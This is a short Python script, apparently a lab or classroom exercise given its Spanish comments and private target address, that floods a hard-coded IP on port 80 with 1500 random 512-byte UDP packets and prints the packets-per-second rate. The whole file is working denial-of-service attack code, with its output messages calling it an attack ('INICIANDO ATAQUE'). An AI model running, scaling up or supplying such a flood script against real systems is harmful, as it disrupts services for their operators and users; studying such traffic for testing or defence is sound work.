import socket
import random
import time

IP_OBJETIVO = "10.80.152.41"
PUERTO = 80
NUM_PAQUETES = 1500
TAMANO       = 512
PAUSA        = 0.002

print(f"--- INICIANDO ATAQUE HACIA {IP_OBJETIVO} ---")

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
enviados = 0
inicio = time.perf_counter()

try:
    for i in range(NUM_PAQUETES):
        s.sendto(random.randbytes(TAMANO), (IP_OBJETIVO, PUERTO))
        enviados += 1
        time.sleep(PAUSA)
finally:
    duracion = time.perf_counter() - inicio
    pps = enviados / duracion
    print(f"Ataque finalizado. Se inyectaron {pps:.0f} paquetes por segundo.")
    s.close()